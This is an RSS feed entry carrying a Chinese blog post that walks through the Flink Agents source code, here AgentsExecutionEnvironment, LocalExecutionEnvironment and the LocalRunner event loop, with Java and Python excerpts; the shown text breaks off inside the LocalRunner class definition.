<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[【大数据 & AI】Flink Agents 源码解读 --- (7) --- AgentsExecutionEnvironment]]></title>    <link>https://juejin.cn/post/7595422019778117682</link>    <guid>https://juejin.cn/post/7595422019778117682</guid>    <pubDate>2026-01-15T14:04:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595422019778117682" data-draft-id="7595422019778101298" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【大数据 &amp; AI】Flink Agents 源码解读 --- (7) --- AgentsExecutionEnvironment"/> <meta itemprop="keywords" content="算法,人工智能"/> <meta itemprop="datePublished" content="2026-01-15T14:04:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="罗西的思考"/> <meta itemprop="url" content="https://juejin.cn/user/351470467691175"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【大数据 &amp; AI】Flink Agents 源码解读 --- (7) --- AgentsExecutionEnvironment
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/351470467691175/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    罗西的思考
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T14:04:18.000Z" title="Thu Jan 15 2026 14:04:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读21分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">【大数据 &amp; AI】Flink Agents 源码解读 --- (7) --- AgentsExecutionEnvironment</h2>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x00 概要</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x01 基础知识</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.1 定义</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.2 功能</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.3 与原生 Flink Environment 的区别</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x02 LocalExecutionEnvironment</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.1 定义</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.2 LocalRunner</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.3 LocalRunnerContext</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x03 RemoteExecutionEnvironment</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.1 核心特色</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.2 与原生 Flink RemoteEnvironment 的对比</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.3 如何使用 ActionExecutionOperator</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.4 典型流程</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.5 交互逻辑</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.6 实现</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0xFF 参考</a></p>
</li>
</ul>
<h3 data-id="heading-1">0x00 概要</h3>
<p>AgentsExecutionEnvironment 是在Flink基础上构建的一个更高层次的执行环境，专门为Agent而设计，同时保留了与原生 Flink API 的兼容性。</p>
<h3 data-id="heading-2">0x01 基础知识</h3>
<p>可以把 Flink 原生的 <code>StreamExecutionEnvironment</code> / <code>TableEnvironment</code> 理解成“Agent 话题里所说的<strong>执行环境</strong>（Execution Environment）”，但是其无法直接被 Agent 使用。因此需要在其上做一些封装和适配，这就是 AgentsExecutionEnvironment。</p>
<ol>
<li>
<p>Flink Environment = 纯粹的<strong>计算资源与运行时容器</strong></p>
<ul>
<li>负责申请 Slot、管理 Checkpoint、调度算子链、网络 Shuffle</li>
<li>对“业务语义”一无所知，也不管用户写的是 ETL、CEP 还是 AI 推理</li>
<li>对应 Agent 词汇表里的“Runtime / Cluster / Engine”这一层</li>
</ul>
</li>
<li>
<p>Agent Environment = 在 Flink Runtime 之上包了一层<strong>语义抽象</strong></p>
<ul>
<li>替用户注册 Chat Model、Tools、Memory、Actions、Event Schema</li>
<li>把“用户消息”或“传感器事件”封装成 Event，按 AgentPlan 去调大模型、执行业务动作</li>
<li>内部仍然用 <code>StreamExecutionEnvironment</code> 去提交算子，只是看不到显式的 <code>keyBy()</code> 和 <code>process()</code>——框架帮用户生成了 <code>ActionExecutionOperator</code></li>
</ul>
</li>
</ol>
<p>类比关系如下：</p>
<pre><code class="hljs">传统 Flink 程序
├─ StreamExecutionEnvironment   ← 纯运行时
├─ your ProcessFunction         ← 用户的业务逻辑
└─ DataStream

Flink Agents 程序
├─ AgentsExecutionEnvironment   ← Agent 语义环境，内部仍持有 StreamExecutionEnvironment
├─ AgentPlan（your business）   ← 定义“遇到啥事件该干啥”
└─ ActionExecutionOperator     ← 框架替用户生成的算子，负责调大模型、更新记忆
</code></pre>
<h4 data-id="heading-3">1.1 定义</h4>
<p>AgentsExecutionEnvironment 的代码如下。</p>
<pre><code class="hljs language-vbnet" lang="vbnet">/**
 * Base <span class="hljs-keyword">class</span> <span class="hljs-keyword">for</span> agent execution environment.
 *
 * &lt;p&gt;This <span class="hljs-keyword">class</span> provides the main entry point <span class="hljs-keyword">for</span> integrating Flink Agents <span class="hljs-keyword">with</span> different types <span class="hljs-keyword">of</span>
 * Flink data sources (DataStream, Table, <span class="hljs-built_in">or</span> simple lists).
 */
<span class="hljs-keyword">public</span> abstract <span class="hljs-keyword">class</span> AgentsExecutionEnvironment {
    <span class="hljs-keyword">protected</span> final Map&lt;ResourceType, Map&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Object</span>&gt;&gt; resources;

    <span class="hljs-keyword">protected</span> AgentsExecutionEnvironment() {
        this.resources = <span class="hljs-built_in">new</span> HashMap&lt;&gt;();
        <span class="hljs-keyword">for</span> (ResourceType type : ResourceType.values()) {
            this.resources.put(type, <span class="hljs-built_in">new</span> HashMap&lt;&gt;());
        }
    }
    
    /**
     * <span class="hljs-keyword">Get</span> agents execution environment.
     *
     * &lt;p&gt;Factory method that creates an appropriate execution environment based <span class="hljs-keyword">on</span> the provided
     * StreamExecutionEnvironment. <span class="hljs-keyword">If</span> no environment <span class="hljs-built_in">is</span> provided, a local execution environment <span class="hljs-built_in">is</span>
     * returned <span class="hljs-keyword">for</span> testing <span class="hljs-built_in">and</span> development.
     *
     * &lt;p&gt;<span class="hljs-keyword">When</span> integrating <span class="hljs-keyword">with</span> Flink DataStream/Table APIs, users should pass the Flink
     * StreamExecutionEnvironment <span class="hljs-keyword">to</span> enable remote execution capabilities.
     *
     * @param env <span class="hljs-keyword">Optional</span> StreamExecutionEnvironment <span class="hljs-keyword">for</span> remote execution. <span class="hljs-keyword">If</span> null, a local
     *     execution environment will be created.
     * @param tEnv <span class="hljs-keyword">Optional</span> StreamTableEnvironment <span class="hljs-keyword">for</span> table-<span class="hljs-keyword">to</span>-stream conversion.
     * @<span class="hljs-keyword">return</span> AgentsExecutionEnvironment appropriate <span class="hljs-keyword">for</span> the execution context.
     */
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentsExecutionEnvironment getExecutionEnvironment(
            StreamExecutionEnvironment env, @Nullable StreamTableEnvironment tEnv) {
        <span class="hljs-keyword">if</span> (env == null) {
            // <span class="hljs-keyword">Return</span> local execution environment <span class="hljs-keyword">for</span> testing/development
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">Class</span>&lt;?&gt; localEnvClass =
                        <span class="hljs-keyword">Class</span>.forName(                                <span class="hljs-string">"org.apache.flink.agents.runtime.env.LocalExecutionEnvironment"</span>);
                <span class="hljs-keyword">return</span> (AgentsExecutionEnvironment)
                        localEnvClass.getDeclaredConstructor().newInstance();
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-keyword">throw</span> <span class="hljs-built_in">new</span> RuntimeException(<span class="hljs-string">"Failed to create LocalExecutionEnvironment"</span>, e);
            }
        } <span class="hljs-keyword">else</span> {
            // <span class="hljs-keyword">Return</span> remote execution environment <span class="hljs-keyword">for</span> Flink integration
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">Class</span>&lt;?&gt; remoteEnvClass =
                        <span class="hljs-keyword">Class</span>.forName(                                <span class="hljs-string">"org.apache.flink.agents.runtime.env.RemoteExecutionEnvironment"</span>);
                <span class="hljs-keyword">return</span> (AgentsExecutionEnvironment)
                        remoteEnvClass
                                .getDeclaredConstructor(
                                        StreamExecutionEnvironment.<span class="hljs-keyword">class</span>,
                                        StreamTableEnvironment.<span class="hljs-keyword">class</span>)
                                .newInstance(env, tEnv);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-keyword">throw</span> <span class="hljs-built_in">new</span> RuntimeException(<span class="hljs-string">"Failed to create RemoteExecutionEnvironment"</span>, e);
            }
        }
    }    
</code></pre>
<h4 data-id="heading-4">1.2 功能</h4>
<p>AgentsExecutionEnvironment 的功能如下：</p>
<ul>
<li>
<p>统一入口：</p>
<ul>
<li>提供getExecutionEnvironment()系列静态工厂方法，可以依据是否传入Flink的 StreamExecutionEnvironment来创建本地或远程执行环境。</li>
<li>支持从不同数据源构建构建Agent管道，包括List，DataStream和Table。</li>
</ul>
</li>
<li>
<p>资源配置管理：</p>
<ul>
<li>内置 resources 映射结构，支持按照资源类型管理各种资源。</li>
<li>提供 addResource() 方法注册可序列化的资源或者资源描述符。</li>
</ul>
</li>
<li>
<p>多输入源支持：</p>
<ul>
<li>fromList()：支持从简单列表创建本地执行环境。</li>
<li>fromDataStream()：集成Flink DataStream API</li>
<li>fromTable()：集成Flink Table API</li>
</ul>
</li>
<li>
<p>配置管理：</p>
<ul>
<li>提供getConfig()抽象方法获取可写的配置对象。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-5">1.3 与原生 Flink Environment 的区别</h4>
<ul>
<li>抽象层级更高：AgentExecutionEnvrionment是对Flink原生环境的封装，在其之上提供了面向Agent的编程模型。主要用于运行Agent，而非 直接处理数据流。</li>
<li>执行模式：AgentExecutionEnvrionment 通过 LocalExecutionEnvironment 和 RemoteExecutionEnvironment 分别支持本地测试和远程集群执行。原生 Flink 主要通过配置参数控制执行模式。</li>
<li>资源管理机制：AgentExecutionEnvrionment 内置了专门的资源注册和管理机制，支持按类型分类管理支援。原生 Flink 没有这种结构化的资源管理方式。</li>
<li>API 设计目标：面向 Agent 编程范式，强调事件驱动的自主行为体模型。原生Flink 更关注数据流处理和批处理操作。</li>
</ul>
<h3 data-id="heading-6">0x02 LocalExecutionEnvironment</h3>
<p>LocalExecutionEnvironment 是 AgentsExecutionEnvironment 的一种实现形式。</p>
<pre><code class="hljs language-ini" lang="ini">Class&lt;?&gt; <span class="hljs-attr">localEnvClass</span> = Class.forName(                                <span class="hljs-string">"org.apache.flink.agents.runtime.env.LocalExecutionEnvironment"</span>)<span class="hljs-comment">;</span>
                return (AgentsExecutionEnvironment)
                        localEnvClass.getDeclaredConstructor().newInstance()<span class="hljs-comment">;</span>
</code></pre>
<p>LocalExecutionEnvironment 主要用于</p>
<ul>
<li>开发阶段的快速测试和调试</li>
<li>无需 Flink 集群即可验证代理逻辑</li>
<li>简化Agent应用的本地开发流程</li>
<li>它与远程执行环境形成对比，后者支持完整的 Flink DataStream 和 Table API 集成。</li>
</ul>
<h4 data-id="heading-7">2.1 定义</h4>
<h5 data-id="heading-8">2.1.1 主要功能</h5>
<p>LocalExecutionEnvironment 的主要功能如下：</p>
<ul>
<li>
<p>本地执行环境实现</p>
<ul>
<li>集成自 AgentExecutionEnvrionment，为本地测试和开发提供执行环境</li>
<li>不依赖 Flink 集群，可以在本地环境中运行和调试代理</li>
</ul>
</li>
<li>
<p>数据源支持</p>
<ul>
<li>通过from_list方法支持从列表数据源读取输入数据</li>
<li>不支持 Flink 的DataStream 和 Table API（这些在远程执行环境中使用）</li>
</ul>
</li>
<li>
<p>资源配置和管理</p>
<ul>
<li>存储和管理通过 add_resource 方法注册的资源</li>
<li>在构建Agent时，将环境中的资源注入到Agent实例中</li>
</ul>
</li>
<li>
<p>代理执行管理</p>
<ul>
<li>通过 set_agent 方法设置待执行的Agent、输入和输出</li>
<li>使用 LocalRunner 在本地执行代理逻辑</li>
<li>通过 execute 方法触发代理执行</li>
</ul>
</li>
<li>
<p>结果收集</p>
<ul>
<li>收集Agent执行的输出结果</li>
<li>通过 to_list 方法返回执行结果</li>
</ul>
</li>
</ul>
<p>根据代码分析， execute 函数在以下情况下被调用：</p>
<ul>
<li>用户手动调用。当用户完成代理配置和输入数据设置后，需要显式调用execute() 方法来启动Agent 执行流程，这通常式配置完所有必要组件后的最后一步。</li>
</ul>
<h5 data-id="heading-9">2.1.2 代码</h5>
<p>LocalExecutionEnvironment 的定义如下，其中 LocalRunner 是核心。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalExecutionEnvironment</span>(<span class="hljs-title class_ inherited__">AgentsExecutionEnvironment</span>):
    <span class="hljs-string">"""Implementation of AgentsExecutionEnvironment for local execution environment."""</span>

    __<span class="hljs-built_in">input</span>: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]] = <span class="hljs-literal">None</span>
    __output: <span class="hljs-type">List</span>[<span class="hljs-type">Any</span>] = <span class="hljs-literal">None</span>
    __runner: LocalRunner = <span class="hljs-literal">None</span>
    __executed: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>
    __config: AgentConfiguration = AgentConfiguration()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_agent</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>: <span class="hljs-built_in">list</span>, output: <span class="hljs-built_in">list</span>, runner: LocalRunner</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Set agent input, output and runner."""</span>
        self.__<span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>
        self.__runner = runner
        self.__output = output

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Execute agent individually."""</span>
        <span class="hljs-keyword">if</span> self.__executed:
            err_msg = (
                <span class="hljs-string">"LocalExecutionEnvironment doesn't support execute multiple times."</span>
            )
            <span class="hljs-keyword">raise</span> RuntimeError(err_msg)
        self.__executed = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">for</span> <span class="hljs-built_in">input</span> <span class="hljs-keyword">in</span> self.__<span class="hljs-built_in">input</span>:
            self.__runner.run(**<span class="hljs-built_in">input</span>)
        outputs = self.__runner.get_outputs()
        <span class="hljs-keyword">for</span> output <span class="hljs-keyword">in</span> outputs:
            self.__output.append(output)        
</code></pre>
<h5 data-id="heading-10">2.1.3 执行流程</h5>
<p>在 LocalExecutionEnvironment 中，execute 方法会：</p>
<ul>
<li>遍历所有输入数据项</li>
<li>对每个输入调用 LocalRunner 的run方法进行处理</li>
<li>收集所有输出结果</li>
</ul>
<p>典型的调用序列如下：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 1. 获取执行环境</span>
<span class="hljs-attr">env</span> = StreamExecutionEnvironment.get_execution_environment()
<span class="hljs-comment"># 2. 添加所需资源</span>
env.add_resource(...)
<span class="hljs-comment"># 3. 设置输入数据</span>
<span class="hljs-attr">output_data</span> = env.from_list(input_data) 
<span class="hljs-comment"># 4. 应用代理</span>
builder.apply(agent) 
<span class="hljs-comment"># 5. 执行代理</span>
env.execute()
<span class="hljs-comment"># 6. 获取结果</span>
<span class="hljs-attr">results</span> = builder.to_list()
</code></pre>
<p>关键特点：</p>
<ul>
<li>手动触发： execute() 不会自动调用，必须由用户显式调用</li>
<li>一次性执行：只能调用一次，多次调用会抛出异常</li>
<li>阻塞操作：在本地环境中，这是个同步阻塞操作，会等待所有输入处理完成</li>
</ul>
<h5 data-id="heading-11">2.1.4 组件关系</h5>
<p>组件关系图如下：</p>
<pre><code class="hljs language-scss" lang="scss">LocalExecutionEnvironmet
    ↓
    ↓ creates
LocalAgentBuilder
    ↓
    ↓ creates
LocalRunner
    ↓
    ↓ creates &amp; <span class="hljs-built_in">run</span>(data)
LocalRunnerContext
</code></pre>
<p>关系说明：</p>
<ul>
<li>LocalExecutionEnvironmet 是入口点，管理整个执行环境。通过 from_list() 创建LocalAgentBuilder</li>
<li>LocalAgentBuilder 负责构建Agent 执行管道，通过 apply() 创建 LocalRunner</li>
<li>LocalRunner 是实际的执行器</li>
<li>LocalRunner 为每个处理的记录创建 LocalRunnerContext</li>
</ul>
<h4 data-id="heading-12">2.2 LocalRunner</h4>
<p>LocalRunner 是本地执行环境中的核心执行器，负责实际运行Agent逻辑。LocalRunner 提供了一个完整的本地执行环境，模拟了Flink 流处理的行为，使得Agent可以在本地进行开发和测试。</p>
<h5 data-id="heading-13">2.2.1 LocalRunner 的主要功能</h5>
<p>LocalRunner 的主要功能：</p>
<ul>
<li>代理执行：将Agent转换为可执行的计划并执行</li>
<li>上下文管理：为每个处理单元创建和管理 LocalRunnerContext</li>
<li>事件处理：管理事件队列并驱动Agent的执行流程</li>
<li>结果收集：收集和存储Agent执行的输出结果</li>
</ul>
<p>run函数是LocalRunner的核心方法，负责处理单个输入记录：</p>
<ul>
<li>
<p>从输入数据中提取键值，用于上下文管理</p>
</li>
<li>
<p>为每个键创建或复用 LocalRunnerContext</p>
</li>
<li>
<p>将输入数据包装成 InputEvent 并发送到事件队列</p>
</li>
<li>
<p>事件循环处理，LocalRunner 的 run 函数使用 while 循环是为了处理事件驱动的代理执行模型。这种设计反映了代理执行的核心机制</p>
<ul>
<li>持续处理事件队列直到为空</li>
<li>如果是输出事件、收集结果</li>
<li>根据事件类型查找对应的动作</li>
<li>执行动作</li>
<li>处理异步处理结果</li>
</ul>
</li>
</ul>

<pre><code class="hljs language-python" lang="python">    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, **data: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]</span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-string">"""Execute the agent to process the given data.

        Parameters
        ----------
        **data : dict[str, Any]
            input record from upstream.

        Returns:
        -------
        key
            The key of the input that was processed.
        """</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">"key"</span> <span class="hljs-keyword">in</span> data:
            key = data[<span class="hljs-string">"key"</span>]
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"k"</span> <span class="hljs-keyword">in</span> data:
            key = data[<span class="hljs-string">"k"</span>]
        <span class="hljs-keyword">else</span>:
            key = uuid.uuid4()

        <span class="hljs-keyword">if</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.__keyed_contexts:
            self.__keyed_contexts[key] = LocalRunnerContext(self.__agent_plan, key, self.__config)
        context = self.__keyed_contexts[key]

        <span class="hljs-keyword">if</span> <span class="hljs-string">"value"</span> <span class="hljs-keyword">in</span> data:
            input_event = InputEvent(<span class="hljs-built_in">input</span>=data[<span class="hljs-string">"value"</span>])
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"v"</span> <span class="hljs-keyword">in</span> data:
            input_event = InputEvent(<span class="hljs-built_in">input</span>=data[<span class="hljs-string">"v"</span>])
        <span class="hljs-keyword">else</span>:
            msg = <span class="hljs-string">"Input data must be dict has 'v' or 'value' field"</span>
            <span class="hljs-keyword">raise</span> RuntimeError(msg)

        context.send_event(input_event)

        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(context.events) &gt; <span class="hljs-number">0</span>:
            event = context.events.popleft()
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(event, OutputEvent):
                self.__outputs.append({key: event.output})
                <span class="hljs-keyword">continue</span>
            event_type = <span class="hljs-string">f"<span class="hljs-subst">{event.__class__.__module__}</span>.<span class="hljs-subst">{event.__class__.__name__}</span>"</span>
            <span class="hljs-keyword">for</span> action <span class="hljs-keyword">in</span> self.__agent_plan.get_actions(event_type):
                context.action_name = action.name
                func_result = action.<span class="hljs-built_in">exec</span>(event, context)
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(func_result, Generator):
                    <span class="hljs-keyword">try</span>:
                        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> func_result:
                            <span class="hljs-keyword">pass</span>
                    <span class="hljs-keyword">except</span> Exception:
                        logger.exception(<span class="hljs-string">"Error in async execution"</span>)
                        <span class="hljs-keyword">raise</span>
        <span class="hljs-keyword">return</span> key
</code></pre>
<h5 data-id="heading-14">2.2.2 事件驱动执行模型</h5>
<p>在 Flink Agents 框架中，代理的执行是基于事件的。每个动作 (action)处理一个事件并可能产生新的事件，这些新事件又会触发其他动作的执行。因此需要一个循环来持续处理事件队列中的事件，直到没有更多事件需要处理。</p>
<p>这种设计使得代理可以处理复杂的、多步骤的交互过程，而不需要预先确定执行步骤的数量。<code>while</code> 循环确保所有相关的事件都被处理完毕，形成了一个完整的事件处理链：</p>
<ul>
<li>持续从事件队列 context.events 中取出事件进行处理</li>
<li>每个事件可能触发一个或多个动作的执行</li>
<li>动作执行可能产生新的事件，这些事件被添加回队列</li>
</ul>
<p>递归事件处理：</p>
<ul>
<li>初始时只有一个 InputEvent</li>
<li>动作处理 InputEvent 可能产生 ChatRequestEvent 等中间事件</li>
<li>中间事件可能触发其他动作，产生更多事件</li>
<li>最终产生 OutputEvent 完成处理</li>
</ul>
<p>完整处理链：</p>
<pre><code class="hljs">InputEvent  → →   start_action  → →   ChatRequestEvent  →  →  LLM处理  → →  ChatResponseEvent  → →   stop_action  → →   OutputEvent
</code></pre>
<p>具体执行流程</p>
<ul>
<li>
<p>初始化：</p>
<ul>
<li>将输入数据包装成 InputEvent 并添加到事件队列</li>
</ul>
</li>
<li>
<p>循环处理：</p>
<ul>
<li>从队列取出事件</li>
<li>根据事件类型找到对应的 actions</li>
<li>执行所有监听该事件类型的动作</li>
<li>动作可能通过 send_event 发送新事件到队列</li>
</ul>
</li>
<li>
<p>终止条件：</p>
<ul>
<li>当事件队列为空时，处理完成</li>
</ul>
</li>
</ul>
<h5 data-id="heading-15">2.2.3 AgentPlan 和 LocalRunner 的关系</h5>
<ul>
<li>LocalRunner 在初始化时候使用 AgentPlan</li>
<li>在执行过程中，LocalRunnerContext 通过 AgentPlan 获取资源和动作</li>
<li>在事件处理中查找对应的动作</li>
</ul>
<p>具体为：LocalRunner 在初始化时候使用 AgentPlan</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalRunner</span>(<span class="hljs-title class_ inherited__">AgentRunner</span>):
    <span class="hljs-string">"""Agent runner implementation for local execution, which is
    convenient for debugging.

    Attributes:
    ----------
    __agent_plan : AgentPlan
        Internal agent plan.
    __keyed_contexts : dict[Any, LocalRunnerContext]
        Dictionary of active contexts indexed by key.
    __outputs:
        Outputs generated by agent execution.
    __config:
        Internal configration.
    """</span>

    __agent_plan: AgentPlan
    __keyed_contexts: <span class="hljs-type">Dict</span>[<span class="hljs-type">Any</span>, LocalRunnerContext]
